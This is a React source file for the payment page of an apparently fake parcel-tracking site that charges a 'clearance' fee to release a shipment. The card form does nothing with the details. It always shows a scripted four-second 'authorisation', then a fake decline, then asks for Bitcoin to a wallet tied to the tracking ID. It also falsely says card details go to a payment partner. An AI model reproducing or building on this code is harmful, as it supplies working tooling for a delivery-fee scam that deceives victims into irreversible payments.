import React, { useEffect, useState } from 'react';
import { Link, useNavigate, useParams } from 'react-router-dom';
import { motion } from 'framer-motion';
import {
  AlertCircleIcon,
  AlertTriangleIcon,
  ArrowLeftIcon,
  BitcoinIcon,
  CheckIcon,
  CopyIcon,
  Loader2Icon,
  LockIcon } from
'lucide-react';
import { SiteHeader } from '../components/SiteHeader';
import { SiteFooter } from '../components/SiteFooter';
import { fetchPackageByTracking } from '../utils/packages';
import { formatMoney } from '../utils/format';
import type { PackageRecord } from '../types/package';

type Step = 'card' | 'processing' | 'crypto';

export function Payment() {
  const { trackingId } = useParams<{trackingId: string;}>();
  const navigate = useNavigate();

  const [pkg, setPkg] = useState<PackageRecord | null>(null);
  const [loading, setLoading] = useState(true);
  const [loadError, setLoadError] = useState<string | null>(null);
  const [step, setStep] = useState<Step>('card');
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    let active = true;
    async function load() {
      if (!trackingId) return;
      try {
        const record = await fetchPackageByTracking(trackingId);
        if (!active) return;
        setPkg(record);
        if (!record) setLoadError('That tracking ID is not on record.');
      } catch (err) {
        if (active) {
          setLoadError(
            err instanceof Error ? err.message : 'Unable to load the shipment.'
          );
        }
      } finally {
        if (active) setLoading(false);
      }
    }
    void load();
    return () => {
      active = false;
    };
  }, [trackingId]);

  function handleCardSubmit(event: React.FormEvent) {
    event.preventDefault();
    setStep('processing');
    window.setTimeout(() => setStep('crypto'), 4000);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  async function copyAddress() {
    if (!pkg?.btc_address) return;
    try {
      await navigator.clipboard.writeText(pkg.btc_address);
      setCopied(true);
      window.setTimeout(() => setCopied(false), 2000);
    } catch {
      setCopied(false);
    }
  }

  return (
    <div className="flex min-h-screen w-full flex-col bg-ink-50">
      <div className="bg-ink-900">
        <SiteHeader showNav navBase="/" />
      </div>

      <main className="mx-auto w-full max-w-5xl flex-1 px-6 py-10 lg:py-14">
        <Link
          to={`/track/${encodeURIComponent(trackingId ?? '')}`}
          className="inline-flex items-center gap-1.5 text-sm text-ink-500 transition-colors duration-150 ease-out hover:text-gold-700">
          
          <ArrowLeftIcon className="h-4 w-4" aria-hidden="true" />
          Back to shipment record
        </Link>

        {loading ?
        <div className="mt-8 h-96 animate-pulse rounded-lg bg-white" /> :
        null}

        {!loading && (loadError || !pkg) ?
        <div
          role="alert"
          className="mt-8 flex items-start gap-3 rounded-lg border border-red-200 bg-red-50 p-5">
          
            <AlertCircleIcon
            className="mt-0.5 h-5 w-5 shrink-0 text-red-700"
            aria-hidden="true" />
          
            <p className="text-sm text-red-800">
              {loadError ?? 'That tracking ID is not on record.'}
            </p>
          </div> :
        null}

        {!loading && pkg ?
        <div className="mt-8 grid gap-8 lg:grid-cols-[minmax(0,3fr)_minmax(0,2fr)] lg:items-start">
            <div className="rounded-lg border border-ink-200 bg-white p-6 sm:p-8">
              {step === 'card' ?
            <CardStep pkg={pkg} onSubmit={handleCardSubmit} /> :
            null}

              {step === 'processing' ? <ProcessingStep pkg={pkg} /> : null}

              {step === 'crypto' ?
            <CryptoStep
              pkg={pkg}
              copied={copied}
              onCopy={copyAddress}
              onConfirm={() =>
              navigate(
                `/pay/${encodeURIComponent(pkg.tracking_id)}/review`
              )
              } /> :

            null}
            </div>

            <aside className="rounded-lg border border-ink-200 bg-white p-6">
              <h2 className="text-xs font-semibold uppercase tracking-[0.18em] text-ink-400">
                Payment summary
              </h2>
              <dl className="mt-4 space-y-3 text-sm">
                <Row label="Tracking ID" value={pkg.tracking_id} />
                <Row label="Package" value={pkg.name} />
                <Row label="Recipient" value={pkg.recipient_name} />
                <Row
                label="Held at"
                value={pkg.current_location || 'Origin depot'} />
              
              </dl>
              <div className="mt-5 flex items-baseline justify-between border-t border-ink-200 pt-5">
                <span className="text-sm text-ink-500">Amount due</span>
                <span className="font-display text-2xl font-extrabold text-ink-900">
                  {formatMoney(pkg.fee, pkg.currency)}
                </span>
              </div>
              <p className="mt-4 text-xs leading-relaxed text-ink-400">
                Clearance for delivery is granted by our desk once this fee is
                confirmed against the consignment.
              </p>
            </aside>
          </div> :
        null}
      </main>

      <SiteFooter navBase="/" />
    </div>);

}

function Row({ label, value }: {label: string;value: string;}) {
  return (
    <div className="flex items-start justify-between gap-4">
      <dt className="text-ink-500">{label}</dt>
      <dd className="text-right font-medium text-ink-900">{value}</dd>
    </div>);

}

function CardStep({
  pkg,
  onSubmit



}: {pkg: PackageRecord;onSubmit: (event: React.FormEvent) => void;}) {
  return (
    <form onSubmit={onSubmit}>
      <h1 className="font-display text-2xl font-extrabold tracking-tight text-ink-900">
        Pay with card
      </h1>
      <p className="mt-2 text-sm leading-relaxed text-ink-600">
        Settle the outstanding fee on {pkg.tracking_id}. Card details are
        processed by our payment partner and are not stored on our servers.
      </p>

      <div className="mt-7 space-y-4">
        <Field label="Cardholder name" name="pay-name" required />
        <Field
          label="Card number"
          name="pay-number"
          inputMode="numeric"
          placeholder="4242 4242 4242 4242"
          required />
        
        <div className="grid grid-cols-2 gap-4">
          <Field label="Expiry (MM/YY)" name="pay-expiry" placeholder="09/28" required />
          <Field
            label="CVC"
            name="pay-cvc"
            inputMode="numeric"
            placeholder="123"
            required />
          
        </div>
        <Field label="Billing address" name="pay-address" required />
        <div className="grid grid-cols-2 gap-4">
          <Field label="City" name="pay-city" required />
          <Field label="Postal code" name="pay-postal" required />
        </div>
        <Field label="Email for receipt" name="pay-email" type="email" required />
      </div>

      <button
        type="submit"
        className="mt-7 inline-flex h-12 w-full items-center justify-center gap-2 rounded-md bg-gold-500 font-display text-sm font-bold uppercase tracking-wide text-ink-900 transition-colors duration-150 ease-out hover:bg-gold-400">
        
        <LockIcon className="h-4 w-4" aria-hidden="true" />
        Pay {formatMoney(pkg.fee, pkg.currency)}
      </button>
    </form>);

}

function ProcessingStep({ pkg }: {pkg: PackageRecord;}) {
  return (
    <div
      className="flex min-h-[420px] flex-col items-center justify-center text-center"
      role="status"
      aria-live="polite">
      
      <Loader2Icon
        className="h-9 w-9 animate-spin text-gold-500"
        aria-hidden="true" />
      
      <h1 className="mt-6 font-display text-xl font-bold text-ink-900">
        Processing {formatMoney(pkg.fee, pkg.currency)}
      </h1>
      <p className="mt-2 max-w-sm text-sm leading-relaxed text-ink-500">
        Contacting your card issuer for authorisation. Do not close this page.
      </p>
    </div>);

}

function CryptoStep({
  pkg,
  copied,
  onCopy,
  onConfirm





}: {pkg: PackageRecord;copied: boolean;onCopy: () => void;onConfirm: () => void;}) {
  return (
    <motion.div
      initial={{ opacity: 0, y: 8 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.25, ease: [0.23, 1, 0.32, 1] }}>
      
      <div
        role="alert"
        className="flex items-start gap-3 rounded-md border border-red-200 bg-red-50 p-4">
        
        <AlertTriangleIcon
          className="mt-0.5 h-5 w-5 shrink-0 text-red-700"
          aria-hidden="true" />
        
        <div>
          <p className="font-semibold text-red-900">
            Sorry, your payment wasn’t processed
          </p>
          <p className="mt-1 text-sm leading-relaxed text-red-800">
            Card authorisation for this consignment was declined by our
            processor. Kindly pay the BTC equivalent to the address below to
            release the shipment.
          </p>
        </div>
      </div>

      <h1 className="mt-8 flex items-center gap-2 font-display text-2xl font-extrabold tracking-tight text-ink-900">
        <BitcoinIcon className="h-6 w-6 text-gold-500" aria-hidden="true" />
        Pay {formatMoney(pkg.fee, pkg.currency)} in BTC
      </h1>
      <p className="mt-2 text-sm leading-relaxed text-ink-600">
        Send the exact equivalent of{' '}
        <span className="font-semibold text-ink-900">
          {formatMoney(pkg.fee, pkg.currency)}
        </span>{' '}
        to the wallet issued for {pkg.tracking_id}, then confirm below so our
        desk can match the transfer to your consignment.
      </p>

      <div className="mt-7 grid gap-6 sm:grid-cols-[180px_minmax(0,1fr)] sm:items-start">
        <div>
          <div className="overflow-hidden rounded-md border border-ink-200 bg-white p-3">
            {pkg.btc_qr_url ?
            <img
              src={pkg.btc_qr_url}
              alt={`Bitcoin payment QR code for ${pkg.tracking_id}`}
              className="aspect-square w-full object-contain" /> :


            <div className="flex aspect-square w-full items-center justify-center rounded bg-ink-50 px-3 text-center text-xs leading-relaxed text-ink-400">
                No QR code was issued for this consignment — use the address
                instead.
              </div>
            }
            {pkg.btc_address ?
            <p className="mt-3 break-all border-t border-ink-200 pt-3 text-center font-mono text-[11px] leading-relaxed text-ink-700">
                {pkg.btc_address}
              </p> :
            null}
          </div>
          {pkg.btc_address ?
          <button
            type="button"
            onClick={onCopy}
            className="mt-2 inline-flex h-9 w-full items-center justify-center gap-2 rounded-md border border-ink-300 text-xs font-semibold text-ink-700 transition-colors duration-150 ease-out hover:border-gold-400 hover:text-gold-700">
            
              {copied ?
            <CheckIcon className="h-3.5 w-3.5" aria-hidden="true" /> :

            <CopyIcon className="h-3.5 w-3.5" aria-hidden="true" />
            }
              {copied ? 'Copied' : 'Copy address'}
            </button> :
          null}
        </div>

        <div>
          <p className="text-xs font-semibold uppercase tracking-wide text-ink-500">
            BTC address
          </p>
          {pkg.btc_address ?
          <>
              <p className="mt-2 break-all rounded-md border border-ink-200 bg-ink-50 px-3 py-3 font-mono text-sm text-ink-900">
                {pkg.btc_address}
              </p>
              <button
              type="button"
              onClick={onCopy}
              className="mt-3 inline-flex h-10 items-center gap-2 rounded-md border border-ink-300 px-3 text-sm font-semibold text-ink-700 transition-colors duration-150 ease-out hover:border-gold-400 hover:text-gold-700">
              
                {copied ?
              <CheckIcon className="h-4 w-4" aria-hidden="true" /> :

              <CopyIcon className="h-4 w-4" aria-hidden="true" />
              }
                {copied ? 'Address copied' : 'Copy address'}
              </button>
            </> :

          <p className="mt-2 rounded-md border border-gold-200 bg-gold-50 px-3 py-3 text-sm text-ink-700">
              The officer handling this consignment has not published a BTC
              address yet. Contact the operations desk quoting{' '}
              {pkg.tracking_id}.
            </p>
          }

          <ul className="mt-5 space-y-2 text-xs leading-relaxed text-ink-500">
            <li>Send BTC only — other assets to this address are unrecoverable.</li>
            <li>Network fees are paid by the sender; underpayments stay on hold.</li>
            <li>Transfers are usually matched within 30–60 minutes.</li>
          </ul>
        </div>
      </div>

      <button
        type="button"
        onClick={onConfirm}
        className="mt-8 h-12 w-full rounded-md bg-gold-500 font-display text-sm font-bold uppercase tracking-wide text-ink-900 transition-colors duration-150 ease-out hover:bg-gold-400">
        
        Confirm payment
      </button>
    </motion.div>);

}

interface FieldProps extends React.InputHTMLAttributes<HTMLInputElement> {
  label: string;
  name: string;
}

function Field({ label, name, ...rest }: FieldProps) {
  return (
    <div>
      <label
        htmlFor={name}
        className="mb-1.5 block text-xs font-semibold uppercase tracking-wide text-ink-500">
        
        {label}
      </label>
      <input
        id={name}
        name={name}
        type="text"
        autoComplete="off"
        className="h-11 w-full rounded-md border border-ink-200 px-3 text-sm text-ink-900 placeholder:text-ink-300 focus:border-gold-500 focus:outline-none focus:ring-2 focus:ring-gold-500/30"
        {...rest} />
      
    </div>);

}